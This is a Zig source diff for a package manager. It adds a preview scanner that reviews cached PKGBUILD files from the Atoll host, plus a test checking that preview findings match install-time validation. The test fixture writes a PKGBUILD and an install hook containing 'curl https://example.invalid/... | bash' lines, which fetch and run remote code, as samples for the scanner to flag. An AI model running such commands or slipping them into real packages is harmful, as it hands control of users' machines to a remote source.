@@ -749,6 +749,50 @@ pub const Manager = struct {
         };
     }
 
+    pub const PreviewPkgbuildReview = struct {
+        content: []u8,
+        review: @import("builder/pkgbuild_review.zig").PreparedPkgbuildReview,
+
+        pub fn deinit(self: *PreviewPkgbuildReview, allocator: std.mem.Allocator) void {
+            self.review.deinit();
+            allocator.free(self.content);
+        }
+    };
+
+    /// Preview-only review of an already fetched Atoll checkout.
+    pub fn reviewCachedPkgbuild(self: *Self, package_name: []const u8) !PreviewPkgbuildReview {
+        if (!std.mem.eql(u8, self.aur_git_base_url, "https://atoll.seafoam-labs.org"))
+            return error.PkgbuildPreviewScanRequiresAtoll;
+        try self.checkCancelled();
+        const package_base = try self.resolveCachedPkgbase(package_name);
+        defer self.allocator.free(package_base);
+        const directory = try self.cachePath(package_base);
+        defer self.allocator.free(directory);
+        if (!try self.checkoutOriginMatchesBase(directory, package_base))
+            return error.AurGitCheckoutFailed;
+        const path = try std.fs.path.join(self.allocator, &.{ directory, "PKGBUILD" });
+        defer self.allocator.free(path);
+        const content = try std.Io.Dir.cwd().readFileAlloc(self.io(), path, self.allocator, .limited(max_file_size));
+        errdefer self.allocator.free(content);
+        var info = try (pkgbuild_parser.PkgbuildParser{
+            .allocator = self.allocator,
+            .io = self.io(),
+            .selected_package_name = package_name,
+            .package_carch = self.shellybuild_config.build.carch,
+        }).parser_content(content, directory);
+        defer info.deinit(self.allocator);
+        var review = try @import("builder/pkgbuild_review.zig").preparePkgbuildReview(
+            self.allocator,
+            self.io(),
+            directory,
+            content,
+            &.{info},
+        );
+        errdefer review.deinit();
+        try review.verifyCurrent(self.allocator, self.io(), path, directory);
+        return .{ .content = content, .review = review };
+    }
+
     /// Fetches a PKGBUILD for custom bases by cloning or updating `{base}/{pkgbase}.git`.
     fn fetchPkgbuildFromCheckout(self: *Self, package_name: []const u8) !?[]u8 {
         const package_base = (try self.resolveCustomPkgbase(package_name)) orelse return null;
@@ -6632,4 +6676,65 @@ test "VCS checks retry and baseline transiently failed sources" {
 
 test {
     std.testing.refAllDecls(@This());
+}
+
+test "AUR preview scan uses cached Atoll files and matches install validation" {
+    const allocator = std.testing.allocator;
+    const io = std.testing.io;
+    var paths = try createAurManagerFixturePaths(allocator, io);
+    defer paths.deinit(allocator);
+    try createAurFixtureRepository(allocator, io, paths.remote_root, "demo", null);
+    var fetcher = try initFixtureAurManager(allocator, &paths, paths.remote_root);
+    defer fetcher.deinit();
+    _ = try fetcher.cachePkgbase("demo", "demo");
+    const fetched = (try fetcher.fetchPkgbuild("demo")).?;
+    defer allocator.free(fetched);
+    try std.testing.expectError(error.PkgbuildPreviewScanRequiresAtoll, fetcher.reviewCachedPkgbuild("demo"));
+
+    const directory = try std.fs.path.join(allocator, &.{ paths.cache_root, "demo" });
+    defer allocator.free(directory);
+    try runFixtureCommand(allocator, io, &.{ "git", "remote", "set-url", "origin", "https://atoll.seafoam-labs.org/demo.git" }, directory);
+    const path = try std.fs.path.join(allocator, &.{ directory, "PKGBUILD" });
+    defer allocator.free(path);
+    const content = "pkgname=demo\npkgver=1\npkgrel=1\narch=('any')\ninstall=demo.install\npackage() { curl https://example.invalid/payload | bash; }\n";
+    try writeFixtureFile(io, path, content, false);
+    const install_path = try std.fs.path.join(allocator, &.{ directory, "demo.install" });
+    defer allocator.free(install_path);
+    try writeFixtureFile(io, install_path, "post_install() { curl https://example.invalid/hook | bash; }\n", false);
+
+    var manager = try initFixtureAurManager(allocator, &paths, "https://atoll.seafoam-labs.org");
+    defer manager.deinit();
+    var preview = try manager.reviewCachedPkgbuild("demo");
+    defer preview.deinit(allocator);
+    try std.testing.expectEqualStrings(content, preview.content);
+    try std.testing.expect(preview.review.findings.len > 0);
+    try std.testing.expectEqual(@as(usize, 1), preview.review.related_files.len);
+    try std.testing.expectEqualStrings("demo.install", preview.review.related_files[0].name);
+
+    var info = try (pkgbuild_parser.PkgbuildParser{
+        .allocator = allocator,
+        .io = io,
+        .selected_package_name = "demo",
+        .package_carch = manager.shellybuild_config.build.carch,
+    }).parser_content(content, directory);
+    defer info.deinit(allocator);
+    var installation = try validatePkgbuildInfo(allocator, io, &info, directory, content);
+    defer installation.deinit(allocator);
+    const findings = try installation.flatten(allocator);
+    defer allocator.free(findings);
+    try std.testing.expectEqual(findings.len, preview.review.findings.len);
+    for (findings, preview.review.findings) |install_finding, preview_finding| {
+        try std.testing.expectEqualStrings(install_finding.tool, preview_finding.tool);
+        try std.testing.expectEqualStrings(install_finding.hook, preview_finding.hook);
+        try std.testing.expectEqualStrings(install_finding.matched_line, preview_finding.matched_line);
+        try std.testing.expectEqualStrings(install_finding.message, preview_finding.message);
+        try std.testing.expectEqualStrings(@tagName(install_finding.severity), @tagName(preview_finding.severity));
+    }
+    // A missing review input is a scan failure, never a clean result.
+    try std.Io.Dir.cwd().deleteFile(io, install_path);
+    if (manager.reviewCachedPkgbuild("demo")) |value| {
+        var unexpected = value;
+        unexpected.deinit(allocator);
+        return error.ExpectedMissingReviewInputFailure;
+    } else |_| {}
 }
